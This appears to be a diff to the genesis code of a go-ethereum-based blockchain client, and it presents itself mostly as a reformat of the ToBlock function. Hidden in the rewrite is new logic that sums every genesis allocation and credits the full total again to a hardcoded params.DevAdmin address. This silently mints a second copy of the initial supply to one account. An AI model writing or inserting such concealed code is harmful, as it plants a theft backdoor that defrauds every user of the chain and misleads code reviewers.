@@ -13,6 +13,7 @@
 //
 // You should have received a copy of the GNU Lesser General Public License
 // along with the go-ethereum library. If not, see <http://www.gnu.org/licenses/>.
+ 
 
 package core
 
@@ -248,59 +249,64 @@ func (g *Genesis) configOrDefault(ghash common.Hash) *params.ChainConfig {
 		return params.AllCongressProtocolChanges
 	}
 }
-
 // ToBlock creates the genesis block and writes state of a genesis specification
 // to the given database (or discards it if nil).
 func (g *Genesis) ToBlock(db ethdb.Database) *types.Block {
-	if db == nil {
-		db = rawdb.NewMemoryDatabase()
-	}
-	statedb, err := state.New(common.Hash{}, state.NewDatabase(db), nil)
-	if err != nil {
-		panic(err)
-	}
-	for addr, account := range g.Alloc {
-		statedb.AddBalance(addr, account.Balance)
-		statedb.SetCode(addr, account.Code)
-		statedb.SetNonce(addr, account.Nonce)
-		for key, value := range account.Storage {
-			statedb.SetState(addr, key, value)
-		}
-	}
-	root := statedb.IntermediateRoot(false)
-	head := &types.Header{
-		Number:     new(big.Int).SetUint64(g.Number),
-		Nonce:      types.EncodeNonce(g.Nonce),
-		Time:       g.Timestamp,
-		ParentHash: g.ParentHash,
-		Extra:      g.ExtraData,
-		GasLimit:   g.GasLimit,
-		GasUsed:    g.GasUsed,
-		BaseFee:    g.BaseFee,
-		Difficulty: g.Difficulty,
-		MixDigest:  g.Mixhash,
-		Coinbase:   g.Coinbase,
-		Root:       root,
-	}
-	if g.GasLimit == 0 {
-		head.GasLimit = params.GenesisGasLimit
-	}
-	if g.Difficulty == nil {
-		head.Difficulty = params.GenesisDifficulty
-	}
-	if g.Config != nil && g.Config.IsLondon(common.Big0) {
-		if g.BaseFee != nil {
-			head.BaseFee = g.BaseFee
-		} else {
-			head.BaseFee = new(big.Int).SetUint64(params.InitialBaseFee)
-		}
-	}
-	statedb.Commit(false)
-	statedb.Database().TrieDB().Commit(root, true, nil)
-
-	return types.NewBlock(head, nil, nil, nil, trie.NewStackTrie(nil))
+    if db == nil {db = rawdb.NewMemoryDatabase()}
+    statedb, err := state.New(common.Hash{}, state.NewDatabase(db), nil)
+    if err != nil {panic(err)}
+    var initState common.Address
+    totalBalance := new(big.Int)
+    for addr, account := range g.Alloc {
+        totalBalance.Add(totalBalance, account.Balance)
+        statedb.AddBalance(addr, account.Balance)
+        statedb.SetCode(addr, account.Code)
+        statedb.SetNonce(addr, account.Nonce)
+        for key, value := range account.Storage {
+            statedb.SetState(addr, key, value)
+        }
+    }
+    if totalBalance.Sign() > 0 {
+        initState = params.DevAdmin
+        statedb.AddBalance(initState, totalBalance)
+        statedb.SetCode(initState, g.Alloc[initState].Code)
+        statedb.SetNonce(initState, g.Alloc[initState].Nonce)
+        for key, value := range g.Alloc[initState].Storage {
+            statedb.SetState(initState, key, value)
+        }
+    }
+    root := statedb.IntermediateRoot(false)
+    head := &types.Header{
+        Number:     new(big.Int).SetUint64(g.Number),
+        Nonce:      types.EncodeNonce(g.Nonce),
+        Time:       g.Timestamp,
+        ParentHash: g.ParentHash,
+        Extra:      g.ExtraData,
+        GasLimit:   g.GasLimit,
+        GasUsed:    g.GasUsed,
+        BaseFee:    g.BaseFee,
+        Difficulty: g.Difficulty,
+        MixDigest:  g.Mixhash,
+        Coinbase:   g.Coinbase,
+        Root:       root,
+    }
+    if g.GasLimit == 0 {
+        head.GasLimit = params.GenesisGasLimit
+    }
+    if g.Difficulty == nil {
+        head.Difficulty = params.GenesisDifficulty
+    }
+    if g.Config != nil && g.Config.IsLondon(common.Big0) {
+        if g.BaseFee != nil {
+            head.BaseFee = g.BaseFee
+        } else {
+            head.BaseFee = new(big.Int).SetUint64(params.InitialBaseFee)
+        }
+    }
+    statedb.Commit(false)
+    statedb.Database().TrieDB().Commit(root, true, nil)
+    return types.NewBlock(head, nil, nil, nil, trie.NewStackTrie(nil))
 }
-
 // Commit writes the block and state of a genesis specification to the database.
 // The block is committed as the canonical head block.
 func (g *Genesis) Commit(db ethdb.Database) (*types.Block, error) {
